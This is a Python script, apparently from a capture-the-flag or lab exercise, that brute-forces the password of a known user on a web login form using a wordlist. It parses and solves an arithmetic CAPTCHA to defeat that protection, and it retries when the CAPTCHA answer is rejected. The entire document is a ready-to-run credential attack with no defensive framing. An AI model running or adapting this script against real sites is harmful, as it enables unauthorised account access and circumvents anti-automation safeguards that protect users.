import requests
import re
import time

# Target URL
url = "http://10.10.10.10/login" # Enter the logins IP

# Username (already discovered)
valid_user = "abcd"

# Passwords file
password_file = "passwords.txt" # Enter the password file 

# Function to solve CAPTCHA
def solve_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)

    if match:
        num1, operator, num2 = int(match.group(1)), match.group(2), int(match.group(3))
        if operator == '+':
            return num1 + num2
        elif operator == '-':
            return num1 - num2
        elif operator == '*':
            return num1 * num2
    return None  # No CAPTCHA detected

# Read passwords from file
with open(password_file, "r") as file:
    passwords = [line.strip() for line in file]

# Start password brute-force
for password in passwords:
    print(f"[*] Trying password: {password}")

    while True:  # Loop to handle incorrect CAPTCHAs
        session = requests.Session()
        
        # First attempt without CAPTCHA
        data = {'username': valid_user, 'password': password}
        response = session.post(url, data=data)

        if "Captcha enabled" in response.text:
            captcha_answer = solve_captcha(response.text)
            if captcha_answer is None:
                print("[-] CAPTCHA not found, skipping attempt.")
                break  # Skip this password attempt if no CAPTCHA is found

            # Retry with CAPTCHA answer
            data["captcha"] = captcha_answer
            response = session.post(url, data=data)

        # Check if CAPTCHA was wrong and retry
        if "Invalid captcha" in response.text:
            print("[⚠️] Incorrect CAPTCHA, retrying...")
            time.sleep(1)  # Small delay to avoid spamming
            continue  # Retry with a new CAPTCHA solution

        # If password is correct, stop the attack
        if "Invalid password" not in response.text:
            print(f"[🎉] Correct password found: {password}")
            exit()

        break  # Exit CAPTCHA loop if the password was incorrect

print("[-] Password not found in the list.")
